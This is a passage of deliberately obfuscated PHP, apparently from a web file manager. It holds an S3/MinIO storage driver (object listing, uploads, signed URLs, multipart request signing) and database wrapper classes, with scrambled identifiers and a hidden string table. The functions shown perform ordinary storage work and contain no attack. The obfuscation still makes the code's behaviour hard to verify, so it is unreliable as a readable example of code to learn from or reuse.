$¾°àë‚ê[$ûÅİıİ»[82]][$ÅÛ‘ú¸Æ] = $this->folderInfo($üòñ¶½, $Â—½ä¡Œ, $üòñ¶½); } foreach ($¾°àë‚ê[$ûÅİıİ»[83]] as $ÅÛ‘ú¸Æ => $üòñ¶½) { $¾°àë‚ê[$ûÅİıİ»[83]][$ÅÛ‘ú¸Æ] = $this->fileInfo($üòñ¶½[$ûÅİıİ»[32]], $Â—½ä¡Œ, $üòñ¶½); } return $¾°àë‚ê; } protected function infoChildren($£Œğ÷, &$õâëºù«) { $ïïì±º€ =& $_SERVER[Ó¡Ÿ§‚]; $ú¬‰“Á­ = $this->fileList($£Œğ÷, $ïïì±º€[12], !0); $õâëºù«[$ïïì±º€[78]] += count($ú¬‰“Á­[$ïïì±º€[82]]); $õâëºù«[$ïïì±º€[77]] += count($ú¬‰“Á­[$ïïì±º€[83]]); foreach ($ú¬‰“Á­[$ïïì±º€[83]] as $˜Äº ) { if (!$˜Äº  || !$˜Äº [$ïïì±º€[76]]) { continue; } $õâëºù«[$ïïì±º€[76]] += $˜Äº [$ïïì±º€[76]]; } } private function fileInfo($ôŒ—„£Ü, $ÃÀÖñ÷» = false, $ªÀõ‹´Ù = array()) { $Åçñà¿ =& $_SERVER[Ó¡Ÿ§‚]; $‡Éé¸§Ü = array($Åçñà¿[32] => $this->pathThis($ôŒ—„£Ü), $Åçñà¿[84] => $this->getPathOuter($ôŒ—„£Ü), $Åçñà¿[33] => $Åçñà¿[200], $Åçñà¿[174] => $this->ext($ôŒ—„£Ü), $Åçñà¿[76] => isset($ªÀõ‹´Ù[$Åçñà¿[76]]) ? $ªÀõ‹´Ù[$Åçñà¿[76]] : 0); if ($ÃÀÖñ÷») { return $‡Éé¸§Ü; } $‡Éé¸§Ü[$Åçñà¿[201]] = $‡Éé¸§Ü[$Åçñà¿[85]] = 0; $‡Éé¸§Ü[$Åçñà¿[202]] = $‡Éé¸§Ü[$Åçñà¿[203]] = !0; if (empty($ªÀõ‹´Ù)) { $ªÀõ‹´Ù = $this->objectMeta($ôŒ—„£Ü); if (!$ªÀõ‹´Ù) { return $‡Éé¸§Ü; } } if (isset($ªÀõ‹´Ù[$Åçñà¿[180]])) { $‡Éé¸§Ü[$Åçñà¿[85]] = $ªÀõ‹´Ù[$Åçñà¿[180]]; } if (isset($ªÀõ‹´Ù[$Åçñà¿[76]])) { $‡Éé¸§Ü[$Åçñà¿[76]] = $ªÀõ‹´Ù[$Åçñà¿[76]]; } return $‡Éé¸§Ü; } private function folderInfo($†Ü«É°ø, $©§ÇÌ‚÷ = false, $Ê¡úÉú¨ = array()) { $ÂÁéº³ =& $_SERVER[Ó¡Ÿ§‚]; $¨—¼›ïò = array($ÂÁéº³[32] => $this->pathThis($†Ü«É°ø), $ÂÁéº³[84] => $this->getPathOuter($ÂÁéº³[8] . $†Ü«É°ø), $ÂÁéº³[33] => $ÂÁéº³[75]); if ($©§ÇÌ‚÷) { return $¨—¼›ïò; } $¨—¼›ïò[$ÂÁéº³[201]] = $¨—¼›ïò[$ÂÁéº³[85]] = 0; $¨—¼›ïò[$ÂÁéº³[202]] = $¨—¼›ïò[$ÂÁéº³[203]] = !0; if ($†Ü«É°ø == $ÂÁéº³[12]) { return $¨—¼›ïò; } if (empty($Ê¡úÉú¨)) { $Ê¡úÉú¨ = $this->objectMeta(trim($†Ü«É°ø, $ÂÁéº³[8]) . $ÂÁéº³[8]); } if (isset($Ê¡úÉú¨[$ÂÁéº³[180]])) { $¨—¼›ïò[$ÂÁéº³[201]] = $Ê¡úÉú¨[$ÂÁéº³[180]]; } return $¨—¼›ïò; } private function fileList($Œ ·«Ù‹, $ÇÁùá¦× = '', $ÌÆßÁ‡Í = 0) { $ÀıäÏàà =& $_SERVER[Ó¡Ÿ§‚]; $‘‹øÖàã = rtrim($Œ ·«Ù‹, $ÀıäÏàà[8]) . $ÀıäÏàà[8]; $©˜Ö´ùš = $this->listObjs($‘‹øÖàã, null, null, $ÇÁùá¦×); if (!$©˜Ö´ùš) { return array($ÀıäÏàà[82] => array(), $ÀıäÏàà[83] => array()); } $¼ŠÆÎê = $¢È´Ëí = array(); foreach ($©˜Ö´ùš[$ÀıäÏàà[204]] as $ÄÓüñ§ª) { $ì½’õØ¸ = $ÄÓüñ§ª[$ÀıäÏàà[32]]; if ($ì½’õØ¸ == $‘‹øÖàã) { continue; } $úµĞ¹Ô£ = isset($ÄÓüñ§ª[$ÀıäÏàà[76]]) ? $ÄÓüñ§ª[$ÀıäÏàà[76]] : 0; $‹±£ƒË“ = $úµĞ¹Ô£ == 0 && substr($ì½’õØ¸, strlen($ì½’õØ¸) - 1, 1) == $ÀıäÏàà[8] ? !0 : !1; $this->cacheMethodInfoSet($ì½’õØ¸, $‹±£ƒË“, $ÄÓüñ§ª); if ($‹±£ƒË“) { $¼ŠÆÎê[] = $ì½’õØ¸; continue; } $¢È´Ëí[] = $ÌÆßÁ‡Í ? $ÄÓüñ§ª : $ì½’õØ¸; } foreach ($©˜Ö´ùš[$ÀıäÏàà[205]] as $ÄÓüñ§ª) { $¼ŠÆÎê[] = $ÄÓüñ§ª[$ÀıäÏàà[32]]; $this->cacheMethodInfoSet($ÄÓüñ§ª[$ÀıäÏàà[32]], !0); } $this->cacheMethodInfoSet($Œ ·«Ù‹, !0); return array($ÀıäÏàà[82] => $¼ŠÆÎê, $ÀıäÏàà[83] => $¢È´Ëí); } private function listObjs($ÜÁÌü‹´, $Óú›È…Â = null, $¼İ€¶›Ä = null, $¯Ö÷¸“’ = null) { $ÎÄµƒá =& $_SERVER[Ó¡Ÿ§‚]; $ÜÁÌü‹´ = trim($ÜÁÌü‹´, $ÎÄµƒá[8]); $ôñÊèœŒ = empty($ÜÁÌü‹´) && $ÜÁÌü‹´ !== $ÎÄµƒá[198] ? $ÎÄµƒá[12] : $ÜÁÌü‹´ . $ÎÄµƒá[8]; return $this->client->getBucket($this->bucket, $ôñÊèœŒ, $Óú›È…Â, $¼İ€¶›Ä, $¯Ö÷¸“’, !0); } public function has($×§¸×¥Ñ, $•ş”ò«¢ = false, $°“‰Š˜í = true) { $„†¡µØ =& $_SERVER[Ó¡Ÿ§‚]; $×§¸×¥Ñ = trim($×§¸×¥Ñ, $„†¡µØ[8]); $ƒß†Úº = empty($×§¸×¥Ñ) && $×§¸×¥Ñ !== $„†¡µØ[198] ? $„†¡µØ[12] : $×§¸×¥Ñ . $„†¡µØ[8]; $İ¢¸‚ù» = null; $ßĞíŠ² = 500; $“¥²ÌôÊ = $„†¡µØ[8]; $¾™³áÅÆ = $š½’Å‘¾ = array(); while (!0) { $ñ¥¦À”ˆ = $this->listObjs($×§¸×¥Ñ, $İ¢¸‚ù», $ßĞíŠ², $“¥²ÌôÊ); if (!$ñ¥¦À”ˆ) { break; } $İ¢¸‚ù» = $ñ¥¦À”ˆ[$„†¡µØ[206]]; $É—†é´ = $ñ¥¦À”ˆ[$„†¡µØ[204]]; $òÃ™Øì = $ñ¥¦À”ˆ[$„†¡µØ[205]]; if (empty($É—†é´) && empty($òÃ™Øì)) { break; } if (count($É—†é´) == 1 && $É—†é´[0][$„†¡µØ[32]] == $ƒß†Úº) { break; } if ($•ş”ò«¢) { if (count($É—†é´)) { $É—†é´ = array_column($É—†é´, $„†¡µØ[32]); $¾™³áÅÆ = array_merge($¾™³áÅÆ, $É—†é´); } if (count($òÃ™Øì)) { $òÃ™Øì = array_column($òÃ™Øì, $„†¡µØ[32]); $š½’Å‘¾ = array_merge($š½’Å‘¾, $òÃ™Øì); } if ($İ¢¸‚ù» === null) { break; } continue; } if ($°“‰Š˜í) { if (!empty($É—†é´)) { if (count($É—†é´) > 1 || isset($É—†é´[0][$„†¡µØ[32]]) && $É—†é´[0][$„†¡µØ[32]] != $ƒß†Úº) { return !0; } } } else { if (!empty($òÃ™Øì)) { return !0; } } if ($İ¢¸‚ù» === null) { break; } } if ($•ş”ò«¢) { $¾™³áÅÆ = array_diff($¾™³áÅÆ, array($ƒß†Úº)); $¾™³áÅÆ = count(array_unique($¾™³áÅÆ)); $š½’Å‘¾ = count(array_unique($š½’Å‘¾)); return array($„†¡µØ[207] => $¾™³áÅÆ, $„†¡µØ[208] => $š½’Å‘¾); } return !1; } public function listAll($ ÓÁî‰Æ) { $˜¦¥€ã« =& $_SERVER[Ó¡Ÿ§‚]; $Á´”ç³ = $this->fileList($ ÓÁî‰Æ, $˜¦¥€ã«[12], !0); $šé¼ûşÓ = array_to_keyvalue($Á´”ç³[$˜¦¥€ã«[83]], $˜¦¥€ã«[32]); foreach ($Á´”ç³[$˜¦¥€ã«[82]] as $İŸ ”Ì) { if (is_string($İŸ ”Ì)) { $šé¼ûşÓ[$İŸ ”Ì] = array($˜¦¥€ã«[76] => 0); } } return $this->listAllFiles($ ÓÁî‰Æ, $šé¼ûşÓ); } public function canRead($€Í½ç¿†) { $äõ¨Ø³ó =& $_SERVER[Ó¡Ÿ§‚]; $ÀáÃÇ½ã = $this->client->getAccessControlPolicy($this->bucket, $€Í½ç¿†); if (!$ÀáÃÇ½ã) { return !1; } return in_array($ÀáÃÇ½ã, array($äõ¨Ø³ó[209], $äõ¨Ø³ó[210], $äõ¨Ø³ó[211])) ? !0 : !1; } public function canWrite($çöç»÷Æ) { $š­¾ÆÚ =& $_SERVER[Ó¡Ÿ§‚]; $¾é€Óòä = $this->client->getAccessControlPolicy($this->bucket, $çöç»÷Æ); if (!$¾é€Óòä) { return !1; } return in_array($¾é€Óòä, array($š­¾ÆÚ[209], $š­¾ÆÚ[210])) ? !0 : !1; } public function getContent($àÂÙ»ı£) { return $this->client->getObject($this->bucket, $àÂÙ»ı£); } public function setContent($¬Õ©£¾ª, $–ó‚“ì = '', $¥ØĞÂÛÜ = false) { $¥³ÊÌí¨ =& $_SERVER[Ó¡Ÿ§‚]; $¬Õ©£¾ª = $¥ØĞÂÛÜ ? trim($¬Õ©£¾ª, $¥³ÊÌí¨[8]) . $¥³ÊÌí¨[8] : $¬Õ©£¾ª; $ÓÈë– = get_file_mime(get_path_ext($¬Õ©£¾ª)); $ ª¯—æ… = $this->client->putObject($–ó‚“ì, $this->bucket, $¬Õ©£¾ª, $¥³ÊÌí¨[199], array(), $ÓÈë–); if (!$ ª¯—æ…) { return !1; } if ($¥ØĞÂÛÜ) { return !0; } $this->cacheMethod(null, null); $ ª¯—æ… = $this->copyFile($¬Õ©£¾ª, $¬Õ©£¾ª, array($¥³ÊÌí¨[212] => $ ª¯—æ…[$¥³ÊÌí¨[213]])); return $ ª¯—æ… ? !0 : !1; } public function fileSubstr($Ãˆ§ßí, $°Ù¼ƒ¾Û, $ÊË—‡øŠ) { $¥ÃÁÀ”“ = $°Ù¼ƒ¾Û + $ÊË—‡øŠ - 1; return $this->client->getObject($this->bucket, $Ãˆ§ßí, array($_SERVER[Ó¡Ÿ§‚][214] => "\x62\171\164\145\163\75{$°Ù¼ƒ¾Û}\x2d{$¥ÃÁÀ”“}")); } public function upload($äë»¡ñ, $¸€„¢á¼, $Úùˆ»ˆ› = false, $ÛáËƒ = REPEAT_REPLACE) { $Æâ•˜ûÇ =& $_SERVER[Ó¡Ÿ§‚]; $òÕµÈÃ = array($Æâ•˜ûÇ[212] => @md5_file($¸€„¢á¼)); $íÜĞ­ö´ = array($Æâ•˜ûÇ[215] => get_file_mime(get_path_ext($äë»¡ñ))); if (IO::size($¸€„¢á¼) <= 1024 * 1024 * 200) { $¼ê×ß™ß = $this->client->putObjectFile($¸€„¢á¼, $this->bucket, $äë»¡ñ, $Æâ•˜ûÇ[199], $òÕµÈÃ, $íÜĞ­ö´); return !empty($¼ê×ß™ß) ? $this->getPathOuter($äë»¡ñ) : !1; } $‚ÏÚ­« = $this->client->multiUploadObject($¸€„¢á¼, $this->bucket, trim($äë»¡ñ, $Æâ•˜ûÇ[8]), $òÕµÈÃ, $íÜĞ­ö´); return $‚ÏÚ­« ? $this->getPathOuter($äë»¡ñ) : !1; } public function download($Û˜ûßæ, $Ì½ÜÏúç) { if (!@is_dir($this->pathFather($Ì½ÜÏúç)) && !IO::mkdir($this->pathFather($Ì½ÜÏúç))) { return !1; } $²½›É¹ = $this->client->getObject($this->bucket, $Û˜ûßæ, array(), $Ì½ÜÏúç); return $²½›É¹ !== !1 ? $Ì½ÜÏúç : !1; } public function link($³Şå³Š‚, $ïÛ´ Ÿâ = array()) { $ÏËÊ¦Şº =& $_SERVER[Ó¡Ÿ§‚]; if ($this->signVer == $ÏËÊ¦Şº[216]) { return $this->client->getAuthenticatedURL($this->bucket, $³Şå³Š‚, 3600 * 12, $ïÛ´ Ÿâ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($³Şå³Š‚, $ÏËÊ¦Şº[8]), 3600 * 12, $this->region, array(), !0, $ïÛ´ Ÿâ); } public function fileOut($ïÇèñóä, $«“ß = false, $ÉŞ¸¡ÔÓ = false, $ˆ½ô¥œ = '') { $ç—ÙÕÒÎ =& $_SERVER[Ó¡Ÿ§‚]; if ($this->isFileOutServer()) { return $this->fileOutServer($ïÇèñóä, $«“ß, $ÉŞ¸¡ÔÓ, $ˆ½ô¥œ); } if (!$ÉŞ¸¡ÔÓ) { $ÉŞ¸¡ÔÓ = $this->pathThis($ïÇèñóä); } $¿•Ï×Ò¥ = get_file_mime(get_path_ext($ÉŞ¸¡ÔÓ)); if ($¿•Ï×Ò¥ == $ç—ÙÕÒÎ[217]) { return parent::fileOut($ïÇèñóä, $«“ß, $ÉŞ¸¡ÔÓ, $ˆ½ô¥œ); } $›¤„ì°š = array($ç—ÙÕÒÎ[218] => $¿•Ï×Ò¥); if ($«“ß) { $›¤„ì°š[$ç—ÙÕÒÎ[219]] = $ç—ÙÕÒÎ[220] . rawurlencode($ÉŞ¸¡ÔÓ); } else { } $ÍçÌì„Ÿ = $this->link($ïÇèñóä, $›¤„ì°š); $this->fileOutLink($ÍçÌì„Ÿ); } public function fileOutServer($™ô°Ûà—, $ÓéããÏ  = false, $æ‰‘¡¡à = false, $û¹ú„ç™ = '') { parent::fileOut($™ô°Ûà—, $ÓéããÏ , $æ‰‘¡¡à, $û¹ú„ç™); } public function fileOutImageServer($°ª¨•ˆ¬, $”Ø€ÙÎ” = 250) { parent::fileOutImage($°ª¨•ˆ¬, $”Ø€ÙÎ”); } public function hashMd5($äïå°, $òä¿öÈ¢ = '') { $øú©é¾• =& $_SERVER[Ó¡Ÿ§‚]; $Ê¨¬ß‚ˆ = $this->objectMeta($äïå°); if (!$Ê¨¬ß‚ˆ) { return !1; } $òä¿öÈ¢ = $òä¿öÈ¢ ? $òä¿öÈ¢ : _get($Ê¨¬ß‚ˆ, $øú©é¾•[221]); $òä¿öÈ¢ = $òä¿öÈ¢ ? $òä¿öÈ¢ : _get($Ê¨¬ß‚ˆ, $øú©é¾•[213], $øú©é¾•[12]); return $òä¿öÈ¢; } public function uploadFormData($øßÅ€—‚, $êŸÄ‹™İ = 3600) { $¢¡±ÉÅ® =& $_SERVER[Ó¡Ÿ§‚]; $¬ÉÇó“ã = $this->pathFather($øßÅ€—‚); $ çò×÷Ì = $this->client->getHttpUploadPostParams($this->bucket, $¬ÉÇó“ã, $¢¡±ÉÅ®[199], $êŸÄ‹™İ); return array_merge((array) $ çò×÷Ì, array($¢¡±ÉÅ®[182] => $this->getHost())); } public function multiUploadFormData($™Ü¨è¶æ, $Ù³š”úı = 3600) { $•îÖ¬„ =& $_SERVER[Ó¡Ÿ§‚]; $ÙˆÌÊÒ = gmdate($•îÖ¬„[222]); $›şïß›© = array(); $ç“úÂ = $this->client->getUploadId($this->bucket, $™Ü¨è¶æ, $›şïß›©); if (!$ç“úÂ) { return !1; } return array($•îÖ¬„[223] => $ç“úÂ, $•îÖ¬„[182] => $this->getHost() . $•îÖ¬„[8] . $this->pathEncode($™Ü¨è¶æ), $•îÖ¬„[224] => $ÙˆÌÊÒ, $•îÖ¬„[94] => $™Ü¨è¶æ); } public function multiUploadAuthData($£©¾‡´•, $¥·¦£ÖÙ = array()) { $ĞÊƒß’Ï =& $_SERVER[Ó¡Ÿ§‚]; $‡‰©øÙ = isset($¥·¦£ÖÙ[$ĞÊƒß’Ï[224]]) ? $¥·¦£ÖÙ[$ĞÊƒß’Ï[224]] : gmdate($ĞÊƒß’Ï[222]); $¾ÈÇŒÌ = isset($¥·¦£ÖÙ[$ĞÊƒß’Ï[174]]) ? $¥·¦£ÖÙ[$ĞÊƒß’Ï[174]] : $ĞÊƒß’Ï[12]; $Ë¶á¶Ï = $¥·¦£ÖÙ[$ĞÊƒß’Ï[94]]; unset($¥·¦£ÖÙ[$ĞÊƒß’Ï[94]]); if (isset($¥·¦£ÖÙ[$ĞÊƒß’Ï[225]])) { $¥·¦£ÖÙ[$ĞÊƒß’Ï[224]] = $‡‰©øÙ; return $this->listUploadParts($Ë¶á¶Ï, $¥·¦£ÖÙ); } $ë½Ì¿îç = array($ĞÊƒß’Ï[226], $ĞÊƒß’Ï[12], $ĞÊƒß’Ï[120], $ĞÊƒß’Ï[12], "\x78\x2d\141\155\172\x2d\x64\x61\x74\145\72{$‡‰©øÙ}", $ĞÊƒß’Ï[8] . $this->bucket . $ĞÊƒß’Ï[8] . $this->pathEncode($Ë¶á¶Ï) . $¾ÈÇŒÌ); if (strpos($¾ÈÇŒÌ, $ĞÊƒß’Ï[227]) === 0) { $ë½Ì¿îç[0] = $ĞÊƒß’Ï[228]; } if (isset($¥·¦£ÖÙ[$ĞÊƒß’Ï[229]]) && $¥·¦£ÖÙ[$ĞÊƒß’Ï[229]] == $ĞÊƒß’Ï[230]) { $ë½Ì¿îç[0] = $ĞÊƒß’Ï[230]; } $÷”Æ‘Âé = implode($ĞÊƒß’Ï[231], $ë½Ì¿îç); $Ïå…ı¨á = base64_encode(hash_hmac($ĞÊƒß’Ï[232], $÷”Æ‘Âé, $this->secret, !0)); $í×›·ØÃ = $ĞÊƒß’Ï[233] . $this->accessKey . $ĞÊƒß’Ï[4] . $Ïå…ı¨á; if (strpos($¾ÈÇŒÌ, $ĞÊƒß’Ï[227]) === 0) { return array($ĞÊƒß’Ï[234] => $í×›·ØÃ, $ĞÊƒß’Ï[224] => $‡‰©øÙ); } return $í×›·ØÃ; } public function listUploadParts($‹˜ô±¹, $£êõØ‡ß = array()) { $Œ÷ò®ä =& $_SERVER[Ó¡Ÿ§‚]; $Á„†ÒÃ­ = str_replace($Œ÷ò®ä[235], $Œ÷ò®ä[12], $£êõØ‡ß[$Œ÷ò®ä[174]]); $öã¦Ÿ¥¤ = $this->client->listParts($this->bucket, $‹˜ô±¹, $Á„†ÒÃ­); if (!$öã¦Ÿ¥¤) { return !1; } unset($£êõØ‡ß[$Œ÷ò®ä[225]], $£êõØ‡ß[$Œ÷ò®ä[229]]); $£êõØ‡ß[$Œ÷ò®ä[94]] = $‹˜ô±¹; $ö§ÓÒ·û = $this->multiUploadAuthData($‹˜ô±¹, $£êõØ‡ß); if (empty($ö§ÓÒ·û)) { return !1; } return array($Œ÷ò®ä[234] => $ö§ÓÒ·û, $Œ÷ò®ä[224] => $£êõØ‡ß[$Œ÷ò®ä[224]], $Œ÷ò®ä[236] => $öã¦Ÿ¥¤); } public function getHost() { return parent::getHost() . $_SERVER[Ó¡Ÿ§‚][8] . $this->bucket; } public function size($Ş¡›Û›Õ) { $ü—–à£á = $this->objectMeta($Ş¡›Û›Õ); return $ü—–à£á ? $ü—–à£á[$_SERVER[Ó¡Ÿ§‚][76]] : 0; } public function info($ÈïŸ¤¹è) { if ($this->isFolder($ÈïŸ¤¹è)) { return $this->folderInfo($ÈïŸ¤¹è); } else { if ($this->isFile($ÈïŸ¤¹è)) { return $this->fileInfo($ÈïŸ¤¹è); } } return !1; } public function exist($ªÔïıÇ) { return $this->isFile($ªÔïıÇ) || $this->isFolder($ªÔïıÇ); } public function isFile($ô´ß¤¿ƒ) { return !$this->isFolder($ô´ß¤¿ƒ) && $this->objectMeta($ô´ß¤¿ƒ); } public function isFolder($ì‚÷¯™) { return $this->cacheMethod($_SERVER[Ó¡Ÿ§‚][165], $ì‚÷¯™); } protected function objectMeta($öâ™º˜±) { return $this->cacheMethod($_SERVER[Ó¡Ÿ§‚][167], $öâ™º˜±); } protected function _objectMeta($ÊöòÒâÒ) { $±£·¢“ =& $_SERVER[Ó¡Ÿ§‚]; $ÊöòÒâÒ = rtrim($ÊöòÒâÒ, $±£·¢“[8]); try { $³‹ëïè¶ = $this->client->getObjectInfo($this->bucket, $ÊöòÒâÒ); if (!isset($³‹ëïè¶[$±£·¢“[221]]) && isset($³‹ëïè¶[$±£·¢“[237]])) { $³‹ëïè¶[$±£·¢“[221]] = $³‹ëïè¶[$±£·¢“[237]]; } } catch (Exception $ëï‡õÓ) { $³‹ëïè¶ = !1; } if (!$³‹ëïè¶) { } return $³‹ëïè¶; } protected function _isFolder($æ«¾¤‚™) { $×º±‰ =& $_SERVER[Ó¡Ÿ§‚]; $æ«¾¤‚™ = rtrim($æ«¾¤‚™, $×º±‰[8]); if ($æ«¾¤‚™ == $×º±‰[12] || $æ«¾¤‚™ == $×º±‰[8]) { return !0; } $î¤‹ä½ï = $this->client->getBucket($this->bucket, $æ«¾¤‚™, null, 1); if (empty($î¤‹ä½ï[$×º±‰[204]])) { return !1; } $›Òª†õ = $î¤‹ä½ï[$×º±‰[204]][0][$×º±‰[32]]; return stripos($›Òª†õ, $æ«¾¤‚™ . $×º±‰[8]) === 0 ? !0 : !1; if (substr($›Òª†õ, -1) == $×º±‰[8]) { return !0; } if (get_path_this($›Òª†õ) == get_path_this($æ«¾¤‚™)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($§ïÙ—µÎ) { parent::__construct($§ïÙ—µÎ); $this->signatureVersion($_SERVER[Ó¡Ÿ§‚][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto E‰ÀÈĞ»ì; B§Ûêöšõ: class DbSqlite extends DbSqliteBase { public function query($‹„ÈúÄ) { $àè¦ ‡ =& $_SERVER[Ó¡Ÿ§‚]; if (!CacheLock::fileLock($àè¦ ‡[13])) { return !1; } $Øò‚ş©º = parent::query($‹„ÈúÄ); CacheLock::fileUnLock($àè¦ ‡[13]); return $Øò‚ş©º; } public function execute($ó°ÃËŸâ) { $í±§¨šé =& $_SERVER[Ó¡Ÿ§‚]; if (!CacheLock::fileLock($í±§¨šé[13])) { return !1; } $‰Ì˜…ß¯ = parent::execute($ó°ÃËŸâ); CacheLock::fileUnLock($í±§¨šé[13]); return $‰Ì˜…ß¯; } } class DbSqlite3 extends DbSqlite3Base { public function query($‚ò¬±Õ) { $äëÎƒ‚ =& $_SERVER[Ó¡Ÿ§‚]; if (!CacheLock::fileLock($äëÎƒ‚[13])) { return !1; } $©Ó´­Ø = parent::query($‚ò¬±Õ); CacheLock::fileUnLock($äëÎƒ‚[13]); return $©Ó´­Ø; } public function execute($èÁ¸±Ğü) { $•¨Ñ“õó =& $_SERVER[Ó¡Ÿ§‚]; if (!CacheLock::fileLock($•¨Ñ“õó[13])) { return !1; } $İóÈáíÑ = parent::execute($èÁ¸±Ğü); CacheLock::fileUnLock($•¨Ñ“õó[13]); return $İóÈáíÑ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\x68\x69\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\75", "\x6e\x65\x71" => "\74\76", "\147\x74" => "\x3e", "\x65\147\x74" => "\x3e\75", "\154\164" => "\74", "\x65\x6c\164" => "\74\75", "\156\157\x74\154\x69\153\x65" => "\116\x4f\124\40\x4c\111\x4b\105", "\x6c\151\153\x65" => "\114\111\113\105", "\x69\x6e" => "\111\116", "\156\157\x74\x69\x6e" => "\116\x4f\x54\x20\111\x4e", "\156\157\x74\40\151\x6e" => "\116\117\x54\40\x49\116", "\142\145\164\x77\145\145\156" => "\102\105\x54\x57\x45\x45\116", "\156\x6f\164\x62\x65\164\167\x65\x65\x6e" => "\x4e\x4f\x54\40\102\105\124\x57\105\105\x4e", "\x6e\157\164\x20\x62\x65\164\x77\x65\x65\x6e" => "\116\x4f\124\x20\102\x45\124\127\x45\105\116"); protected $selectSql = "\x53\x45\x4c\x45\103\124\x25\x44\x49\x53\124\111\x4e\103\124\45\40\45\106\111\x45\x4c\x44\45\40\x46\122\x4f\115\40\x25\x54\x41\x42\114\x45\45\45\112\x4f\111\x4e\45\45\127\x48\105\122\x45\45\x25\107\122\117\x55\120\x25\45\x48\101\x56\x49\x4e\x47\45\45\117\x52\104\105\122\45\x25\114\111\115\111\x54\x25\x20\45\125\116\x49\x4f\x4e\x25\45\103\x4f\x4d\x4d\x45\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $‰©°×òŠ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Ó¡Ÿ§‚][959], $‰©°×òŠ); } public function factory($«éåÎØ = '') { $÷ìüí ¸ =& $_SERVER[Ó¡Ÿ§‚]; $«éåÎØ = $this->parseConfig($«éåÎØ); if (empty($«éåÎØ[$÷ìüí ¸[960]])) { think_exception(think_lang($÷ìüí ¸[961])); } $this->dbType = ucwords(strtolower($«éåÎØ[$÷ìüí ¸[960]])); $Ğı‚œ– = $÷ìüí ¸[962] . $this->dbType; if (class_exists($Ğı‚œ–)) { $°œÓÜõ‡ = new $Ğı‚œ–($«éåÎØ); if ($÷ìüí ¸[963] != strtolower($«éåÎØ[$÷ìüí ¸[960]])) { $°œÓÜõ‡->dbType = strtoupper($this->dbType); } else { $°œÓÜõ‡->dbType = $this->_getDsnType($«éåÎØ[$÷ìüí ¸[915]]); } } else { think_exception(think_lang($÷ìüí ¸[964]) . $÷ìüí ¸[965] . $Ğı‚œ–); } return $°œÓÜõ‡; } public function __call($õ¹­Ÿœ€, $èÀ‡›Ë) { if (method_exists($this, $õ¹­Ÿœ€)) { return call_user_func_array(array($this, $õ¹­Ÿœ€), $èÀ‡›Ë); } } protected function _getDsnType($Ùñî“êö) { $ß¹„¾Õ = explode($_SERVER[Ó¡Ÿ§‚][4], $Ùñî“êö); $úÊ¦Ÿç = strtoupper(trim($ß¹„¾Õ[0])); return $úÊ¦Ÿç; } private function parseConfig($ÚƒêÄåã = '') { $Ë±Ôäúë =& $_SERVER[Ó¡Ÿ§‚]; if (!empty($ÚƒêÄåã) && is_string($ÚƒêÄåã)) { $ÚƒêÄåã = $this->parseDSN($ÚƒêÄåã); } elseif (is_array($ÚƒêÄåã)) { $ÚƒêÄåã = array_change_key_case($ÚƒêÄåã); $ÚƒêÄåã = array($Ë±Ôäúë[960] => $ÚƒêÄåã[$Ë±Ôäúë[966]], $Ë±Ôäúë[887] => $ÚƒêÄåã[$Ë±Ôäúë[967]], $Ë±Ôäúë[888] => $ÚƒêÄåã[$Ë±Ôäúë[968]], $Ë±Ôäúë[885] => $ÚƒêÄåã[$Ë±Ôäúë[969]], $Ë±Ôäúë[886] => $ÚƒêÄåã[$Ë±Ôäúë[970]], $Ë±Ôäúë[21] => $ÚƒêÄåã[$Ë±Ôäúë[971]], $Ë±Ôäúë[915] => $ÚƒêÄåã[$Ë±Ôäúë[972]], $Ë±Ôäúë[17] => isset($ÚƒêÄåã[$Ë±Ôäúë[973]]) ? $ÚƒêÄåã[$Ë±Ôäúë[973]] : array()); } elseif (empty($ÚƒêÄåã)) { if (think_config($Ë±Ôäúë[974]) && $Ë±Ôäúë[963] != strtolower(think_config($Ë±Ôäúë[975]))) { $ÚƒêÄåã = $this->parseDSN(think_config($Ë±Ôäúë[974])); } else { $ÚƒêÄåã = array($Ë±Ôäúë[960] => think_config($Ë±Ôäúë[975]), $Ë±Ôäúë[887] => think_config($Ë±Ôäúë[976]), $Ë±Ôäúë[888] => think_config($Ë±Ôäúë[977]), $Ë±Ôäúë[885] => think_config($Ë±Ôäúë[978]), $Ë±Ôäúë[886] => think_config($Ë±Ôäúë[979]), $Ë±Ôäúë[21] => think_config($Ë±Ôäúë[246]), $Ë±Ôäúë[915] => think_config($Ë±Ôäúë[974]), $Ë±Ôäúë[17] => think_config($Ë±Ôäúë[980])); } } return $ÚƒêÄåã; } protected function initConnect($È’¢ÚÛ = true) { if (1 == think_config($_SERVER[Ó¡Ÿ§‚][22])) { $this->_linkID = $this->multiConnect($È’¢ÚÛ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Ô·Ğ‘òÀ => $®ã˜‹®) { $this->_linkID = $®ã˜‹®; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($™ßùïÚ© = false) { $‰˜Ëœä =& $_SERVER[Ó¡Ÿ§‚]; static $ÚµÜáÎ’ = array(); static $ÃÃß÷Ÿ“ = -1; if (empty($ÚµÜáÎ’)) { foreach ($this->config as $Ê§É‹è¾ => $…–ãÚ¬‰) { $ÚµÜáÎ’[$Ê§É‹è¾] = explode($‰˜Ëœä[50], $…–ãÚ¬‰); } } if (think_config($‰˜Ëœä[981])) { if ($™ßùïÚ© || think_config($‰˜Ëœä[395]) === !0) { $Œ‚éàñ§ = floor(mt_rand(0, think_config($‰˜Ëœä[982]) - 1)); $ÃÃß÷Ÿ“ = $Œ‚éàñ§; } else { if (is_numeric(think_config($‰˜Ëœä[983]))) { $Œ‚éàñ§ = think_config($‰˜Ëœä[983]); } else { 